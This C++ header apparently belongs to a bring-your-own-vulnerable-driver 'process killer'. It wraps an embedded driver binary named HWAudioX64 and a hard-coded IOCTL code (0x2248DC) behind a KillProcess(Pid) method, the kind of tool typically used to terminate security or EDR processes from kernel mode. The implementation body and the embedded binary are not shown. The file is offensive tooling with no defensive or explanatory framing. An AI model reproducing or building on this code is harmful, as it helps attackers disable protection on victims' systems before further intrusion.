#pragma once
#include <windows.h>
#include <string>
#include "DriverProvider.hpp"
#include "DriverService.hpp"
#include "Singleton.hpp"
#include "ObjectProxy.hpp"
#include "HWAudioX64Bin.hpp"
#include "DriverKiller.hpp"

class HWAudioX64 final :
	public DriverKiller<HWAudioX64>,
	public Singleton<HWAudioX64>
{
	friend class Singleton<HWAudioX64>;

private:
	static constexpr ULONG IOCTL_KILL_PROCESS = 0x2248DCu;

public:
	explicit HWAudioX64(Token) noexcept : HWAudioX64()
	{
	}
	~HWAudioX64() = default;

	BOOLEAN InitKiller() noexcept
	{
		return DriverKiller::Initialize(HWAudioX64Bin::hexData,
										HWAudioX64Bin::hexSize,
										HWAudioX64Bin::service,
										HWAudioX64Bin::serviceSize,
										HWAudioX64Bin::Key);
	}

	BOOLEAN
		KillProcess(ULONG Pid);

private:
	HWAudioX64() = default;
};



inline constexpr ObjectProxy<HWAudioX64> g_HWAudioX64{};

